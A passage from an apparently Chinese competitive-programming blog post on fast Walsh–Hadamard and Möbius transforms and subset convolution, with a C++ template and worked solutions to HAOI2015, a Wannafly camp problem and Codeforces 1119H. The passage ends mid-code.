class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 0, i##_end_ = (n); i &lt; i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Template starts here</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1000000009</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">muln</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1LL</span> * x * y % MOD; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = muln(x, x))</span><br><span class="line">        <span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = muln(ret, x);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">mo</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt;= MOD) x -= MOD;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; <span class="number">0</span>) x += MOD;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Len, Base; <span class="comment">// Ensure these values are calculated!!!!</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">fmt_or</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="keyword">int</span> dmt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Base; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>)</span><br><span class="line">            A[S|(<span class="number">1</span>&lt;&lt;i)] = mo(A[S|(<span class="number">1</span>&lt;&lt;i)] + dmt*A[S]);</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">fmt_and</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="keyword">int</span> dmt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Base; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>)</span><br><span class="line">            A[S] = mo(A[S] + dmt*A[S|(<span class="number">1</span>&lt;&lt;i)]);</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">fwt_xor</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="keyword">int</span> dwt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l, r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Base; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">            l = A[S], r = A[S|(<span class="number">1</span>&lt;&lt;i)];</span><br><span class="line">            A[S] = mo(l + r);</span><br><span class="line">            A[S|(<span class="number">1</span>&lt;&lt;i)] = mo(l - r);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(dwt==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> inv2 = qpow(Len, MOD<span class="number">-2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">            A[S] = muln(A[S], inv2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">conv</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; B, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(*fn)(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,<span class="keyword">int</span>))</span> </span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; aa = fn(A, <span class="number">1</span>), bb = fn(B, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Len; ++i)</span><br><span class="line">        aa[i] = muln(aa[i], bb[i]);</span><br><span class="line">    aa = fn(aa, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> aa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pc;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_popcount</span><span class="params">(<span class="keyword">int</span> sz)</span> </span>&#123;</span><br><span class="line">    pc.resize(sz, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; sz; ++i)</span><br><span class="line">        pc[i] = pc[i &gt;&gt; <span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">subset_conv</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; B)</span> </span>&#123;</span><br><span class="line">    get_popcount(Len);</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">H</span><span class="params">(Len)</span></span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt; <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; siga(Base+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(Len,<span class="number">0</span>)), sigb = siga, sigh = siga;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">        siga[pc[S]][S] = A[S], sigb[pc[S]][S] = B[S];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= Base; ++i) &#123;</span><br><span class="line">        siga[i] = fmt_or(siga[i], <span class="number">1</span>);</span><br><span class="line">        sigb[i] = fmt_or(sigb[i], <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j)</span><br><span class="line">                sigh[i][S] = mo(sigh[i][S] + muln(siga[j][S], sigb[i-j][S]));</span><br><span class="line">        sigh[i] = fmt_or(sigh[i], <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">        H[S] = sigh[pc[S]][S];</span><br><span class="line">    <span class="keyword">return</span> H;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Template ends here</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> g : v) &#123;</span><br><span class="line">        <span class="keyword">if</span>(first) first = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a, b;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    m = Len = <span class="number">1</span> &lt;&lt; n, Base = n;</span><br><span class="line">    a.resize(m), b.resize(m);</span><br><span class="line">    rep(i, m) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    rep(i, m) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">    </span><br><span class="line">    show(conv(a, b, fmt_and));</span><br><span class="line">    show(conv(a, b, fmt_or));</span><br><span class="line">    show(conv(a, b, fwt_xor));</span><br><span class="line">    show(subset_conv(a, b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="HAOI2015-按位或"><a href="#HAOI2015-按位或" class="headerlink" title="[HAOI2015] 按位或"></a>[HAOI2015] 按位或</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>刚开始你有一个数字0，每一秒钟你会随机选择一个 $[0,2^n-1]$ 的数字，与你手上的数字进行按位或操作。选择数字 $i$ 的概率是 $p_i$。保证 $0\leq p_i \leq1$，$\sum p_i = 1$。问期望多少秒后，你手上的数字变成 $2^n-1$。无穷输出 <code>INF</code></p><p>数据范围：$n\leq 20$</p><p>Source: <a href="https://lydsy.com/JudgeOnline/problem.php?id=4036">BZOJ4036</a> vfk论文第一道例题。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>留坑。</p><h2 id="Day8-I-岸边露伴的人生经验"><a href="#Day8-I-岸边露伴的人生经验" class="headerlink" title="Day8 I. 岸边露伴的人生经验"></a>Day8 I. 岸边露伴的人生经验</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>岸边露伴是一个天才漫画家，他经常用自己的替身天堂之门来查看别人的人生经历，为自己的漫画积累素材。最近他学会了将一个人的人生经历编码成一个 $10$ 维的向量，每一维取值为 ${0,1,2}$ 中的一个元素。定义向量$\overrightarrow{V}=(x_1,x_2,\cdots,x_{10})$ 的模长 $|\overrightarrow{V}|$ 为 $\sqrt{x_1^2+x_2^2+\cdots+x_{10}^2}$。令第 $i$ 个人的人生经历对应的向量为$\overrightarrow{V_i}$，则第i<em>i</em>个人和第 $j$ 个人的人生轨迹的差别可以用 $|\overrightarrow{V_i}-\overrightarrow{V_j}|$ 衡量。岸边露伴收集了 $n$ 个人的向量，他想要知道这些人里，人生轨迹差别相同的二元组有多少对，即有多少个四元组 $(i,j,k,l)(1 \le i,j,k,l \le n)$ 满足 $|\overrightarrow{V_i}-\overrightarrow{V_j}|=|\overrightarrow{V_k}-\overrightarrow{V_l}|$ </p><p>数据范围：$n\leq 10^5$</p><p>Source: <a href="https://www.cometoj.com/contest/28/problem/I?problem_id=412">CCPC-Wannafly Winter Camp Day8 (Div1, onsite) Day 8 Problem I</a></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>考虑每个向量取值只有 ${0,1}$ 的情况，每个人的向量为一个二进制数，装进桶里，直接进行自己卷积自己的异或 FWT ，这时集合幂级数的每一项都代表这个集合被异或出来的 可能方式。再扫一遍每一个状态，按照 <code>bitcount</code> 统计距离，加入另一个数组，平方一下即可。</p><p>考虑这道题，多了一个 $2$ ，我们只需要把每一个向量中一个数位拆成两个字符即可，将 <code>1</code> 变为 <code>01</code> ，2 变为 <code>10</code> ， <code>0</code> 变为 <code>00</code> ，然后把上一种做法求 <code>bitcount</code> 统计距离的方式稍微改一下就可以了。</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><div><div class="fold_hider"><div class="close hider_title">点击显示/隐藏代码</div></div><div class="fold"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by powerful Codeforces Tool</span></span><br><span class="line"><span class="comment"> * Author: YangDavid</span></span><br><span class="line"><span class="comment"> * Time: 2019-04-28 19:15:38</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1, i##_end_ = (n); i &lt;= i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">202000</span>, maxs = <span class="number">1</span> &lt;&lt; <span class="number">20</span>, BB = <span class="number">20</span>, MOD = <span class="number">998244353</span>;</span><br><span class="line"><span class="keyword">int</span> n, dif[<span class="number">10200</span>];</span><br><span class="line">vector&lt;int&gt; a(maxs, 0), val(maxs, 0);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">muln</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1LL</span> * x * y % MOD; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mo</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt;= MOD) x -= MOD;</span><br><span class="line"><span class="keyword">if</span>(x &lt; <span class="number">0</span>) x += MOD;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = muln(x, x))</span><br><span class="line"><span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = muln(ret, x);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fwt</span><span class="params">(<span class="keyword">int</span> dwt)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BB; ++i) &#123;</span><br><span class="line"><span class="keyword">int</span> mask = (maxs<span class="number">-1</span>) ^ (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> S = mask; S &gt;= <span class="number">0</span>; S = (S<span class="number">-1</span>)&amp;mask) &#123;</span><br><span class="line">l = a[S], r = a[S | (<span class="number">1</span>&lt;&lt;i)];</span><br><span class="line">a[S] = mo(l + r);</span><br><span class="line">a[S|(<span class="number">1</span>&lt;&lt;i)] = mo(l - r);</span><br><span class="line"><span class="keyword">if</span>(S == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dwt == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> fac = qpow(qpow(<span class="number">2</span>, MOD - <span class="number">2</span>), BB);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxs; ++i)</span><br><span class="line">a[i] = muln(a[i], fac);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="keyword">int</span> msk = <span class="number">0</span>, x;</span><br><span class="line">    rep(j, <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    msk &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">1</span>) msk += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x == <span class="number">2</span>) msk += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">a[msk]++;</span><br><span class="line">    &#125;</span><br><span class="line">    fwt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxs; ++i)</span><br><span class="line">    a[i] = muln(a[i], a[i]);</span><br><span class="line">    fwt(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    val[<span class="number">0</span>] = <span class="number">0</span>, val[<span class="number">1</span>] = <span class="number">1</span>, val[<span class="number">2</span>] = <span class="number">4</span>, val[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">4</span>; S &lt; maxs; S += <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> t = val[S &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    val[S] = t;</span><br><span class="line">    val[S+<span class="number">1</span>] = t + <span class="number">1</span>;</span><br><span class="line">    val[S+<span class="number">2</span>] = t + <span class="number">4</span>;</span><br><span class="line">    val[S+<span class="number">3</span>] = t + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; maxs; ++S) &#123;</span><br><span class="line">    dif[val[S]] += a[S];</span><br><span class="line">    &#125;</span><br><span class="line">    ll res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; ++i) &#123;</span><br><span class="line">    res = mo(res + <span class="number">1LL</span> * dif[i] * dif[i] % MOD);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><h2 id="CF1119-H-难题，精妙的-FWT"><a href="#CF1119-H-难题，精妙的-FWT" class="headerlink" title="CF1119 H. 难题，精妙的 FWT"></a>CF1119 H. 难题，精妙的 FWT</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>给定 $a,b,c$ ，以及 $n$ 个 $k$ 位 bitmask $A_i,B_i,C_i$ ，求下面 $n$ 个集合幂级数的异或 FWT，即：<br>$$<br>\prod_{1\leq i\leq n} (ax^{A_i}+bx^{B_i}+cx^{C_i})<br>$$<br>数据范围：$n\leq 10^5,k\leq 17,0\leq A_i,B_i,C_i &lt; 2^k,$</p><p>Source: <a href="https://codeforces.com/contest/1119/problem/H">Codeforces Global Round 2 Problem H</a></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>按照正常的 FWT 思路，就是把这 $n$ 个集合幂级数分别求出 FWT，然后再点乘起来，然后再做 IFWT。复杂度是 $O(nk2^k)$ 的，无法通过此题。</p><p>但是这道题需要注意的一点是每一个集合幂级数都只有三项，并且 $a,b,c$ 是固定的。回顾 FWT 的公式：<br>$$<br>\hat{f}(S) = \sum_{T\subseteq 2^U} f(T) (-1)^{|S\cap T|}<br>$$<br>因此每个集合幂级数 FWT 之后也仅仅会有 $\pm a \pm b \pm c$ 这么 8 种项。为了使问题更加简单，我们进行这样的变换： $B_i:=B_i \oplus A_i,C_i := C_i \oplus A_i, A_i := 0$ 。变换之后我们得出的结果的第 $S$ 项就等价于答案的第 $S\oplus xorsum$ 项，其中 $xorsum = \oplus_{i=1}^n A_i$。可以发现，这样做之后只剩下 $a\pm b \pm c$ 这四项了。</p><p>我们的一个重要观察是，将 FWT 之后的这 $n$ 个集合幂级数乘起来的结果中，对于一个固定的位置 $S$ ，这一项的系数一定是 $(a+b+c)^x (a+b-c)^y (a-b+c)^z (a-b-c)^w$ 的形式。如果我们能够把 $x,y,z,w$ 解出来，整个问题就解决了。首先，我们有一个最朴素的关系式：<br>$$<br>x+y+z+w = n<br>$$<br>之后有两种说法，一种是<a href="https://codeforces.com/blog/entry/66411">官方题解</a>所说的考虑所有 $n$ 个 FWT 之后的幂级数的第 $S$ 项之和，然后再多考虑一个条件即可得到四个方程；另一种则非常简洁、对称、优美，可是我对这种方法还没有简洁优美的证明。这种方法是这样的：</p><ul><li>将 $A_i\oplus B_i$ 的值统计入一个数组 $f$，对 $f$ FWT之后，对于其第 $S$ 项有：$x+y-z-w=f[S]$。</li><li>将 $A_i\oplus C_i$ 的值统计入一个数组 $g$，对 $g$ FWT之后，对于其第 $S$ 项有：$x-y+z-w=g[S]$。</li><li>将 $B_i\oplus C_i$ 的值统计入一个数组 $h$，对 $h$ FWT之后，对于其第 $S$ 项有：$x-y-z+w=h[S]$。</li></ul><p>然后消元法即可。</p><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><div><div class="fold_hider"><div class="close hider_title">点击显示/隐藏代码</div></div><div class="fold"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by powerful Codeforces Tool</span></span><br><span class="line"><span class="comment"> * Author: YangDavid</span></span><br><span class="line"><span class="comment"> * Time: 2019-05-02 16:57:53</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1, i##_end_ = (n); i &lt;= i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">102000</span>, MS = (<span class="number">1</span> &lt;&lt; <span class="number">17</span>) + <span class="number">2</span>, MOD = <span class="number">998244353</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], B[maxn], C[maxn], n, k, full;</span><br><span class="line"><span class="keyword">int</span> AB[MS], AC[MS], BC[MS], ans[MS], out[MS];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mo</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">if</span>(x &gt;= MOD) x -= 